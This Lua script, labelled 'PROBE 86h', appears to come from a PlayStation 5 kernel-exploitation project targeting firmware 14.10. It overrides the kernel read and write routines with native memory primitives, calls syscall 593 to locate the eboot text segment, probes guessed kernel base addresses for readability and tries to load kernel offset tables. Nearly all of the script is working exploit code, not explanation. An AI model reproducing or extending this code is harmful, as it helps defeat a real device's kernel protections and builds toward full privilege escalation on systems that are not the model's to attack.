-- CRASH_CLASS: MODERATE
-- PROBE 86h: Full kernel R/W replacement + test kernel VA reads
-- native.read_buffer/write_buffer confirmed working on userland
-- Test if they can read kernel addresses

print("=== PROBE 86h ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

print("pid=" .. to_num(syscall.getpid()))

-- Replace kernel R/W functions
kernel.read_qword = function(addr)
    local data = native.read_buffer(addr, 8)
    if not data or #data < 8 then return uint64(0) end
    local b1, b2, b3, b4, b5, b6, b7, b8 = data:byte(1, 8)
    local lo = b1 + b2*256 + b3*65536 + b4*16777216
    local hi = b5 + b6*256 + b7*65536 + b8*16777216
    return uint64(string.format("0x%X%08X", hi, lo))
end

kernel.write_qword = function(addr, val)
    local h, l = get_hi_lo(val)
    local data = string.char(
        l % 256, math.floor(l/256) % 256, math.floor(l/65536) % 256, math.floor(l/16777216) % 256,
        h % 256, math.floor(h/256) % 256, math.floor(h/65536) % 256, math.floor(h/16777216) % 256
    )
    native.write_buffer(addr, data)
end

kernel.read_dword = function(addr)
    local data = native.read_buffer(addr, 4)
    if not data or #data < 4 then return 0 end
    local b1, b2, b3, b4 = data:byte(1, 4)
    return b1 + b2*256 + b3*65536 + b4*16777216
end

print("kernel R/W replaced")

-- Test 1: Read from eboot .text (known userland RX)
print("")
print("--- EBOOT READ ---")
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
make_syscall(593)(uint64(1), uint64(info))
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot=" .. tostring(eboot))

local ok1, r1 = pcall(kernel.read_qword, eboot)
print("eboot_read ok=" .. tostring(ok1) .. " val=" .. tostring(r1))

-- Test 2: Try reading a kernel address
-- We don't have one yet, but we can try the common PS5 kernel base
-- FreeBSD kernel typically at 0xFFFFFFFF8xxxxxxx
-- PS5 kernel base for 14.10 is unknown. Try a few common ones.
print("")
print("--- KERNEL VA PROBE ---")
-- These are speculative kernel base addresses
local candidates = {
    "0xFFFFFFFF82200000",  -- common FreeBSD
    "0xFFFFFFFF84000000",  -- PS5 estimate
}

for _, addr_str in ipairs(candidates) do
    local ok, r = pcall(function()
        return native.read_buffer(uint64(addr_str), 4)
    end)
    if ok and r and #r >= 4 then
        local b1, b2, b3, b4 = r:byte(1, 4)
        local val = b1 + b2*256 + b3*65536 + b4*16777216
        print(string.format("  %s = 0x%08X *** READABLE ***", addr_str, val))
    else
        print(string.format("  %s = FAIL (%s)", addr_str, tostring(r):sub(1, 60)))
    end
end

-- Test 3: Try to initialize kernel offsets now that R/W works
print("")
print("--- INIT KERNEL OFFSETS ---")
if initialize_kernel_offsets then
    local ok3, r3 = pcall(initialize_kernel_offsets)
    print("init ok=" .. tostring(ok3) .. " r=" .. tostring(r3))
else
    print("initialize_kernel_offsets not found")
    -- Check if it's in kernel table
    if kernel.initialize_offsets then
        local ok3, r3 = pcall(kernel.initialize_offsets)
        print("kernel.init ok=" .. tostring(ok3))
    end
end

-- Test 4: Try update_kernel_offsets
print("")
print("--- UPDATE OFFSETS ---")
if update_kernel_offsets then
    print("exists")
elseif kernel.update_offsets then
    print("kernel.update_offsets exists")
end

-- Test 5: Scan for ps5_kernel_offset_list to find offset patterns
print("")
print("--- OFFSET LIST ---")
if ps5_kernel_offset_list then
    -- Get the 10.01 entry (closest to 14.10)
    local closest = nil
    for _, entry in ipairs(ps5_kernel_offset_list) do
        if entry.fw_version then
            print("fw=" .. tostring(entry.fw_version))
            closest = entry
        elseif entry[1] then
            print("fw=" .. tostring(entry[1]))
        end
    end
    if closest then
        for k, v in pairs(closest) do
            print("  " .. tostring(k) .. "=" .. tostring(v))
        end
    end
end

print("=== PROBE 86h COMPLETE ===")
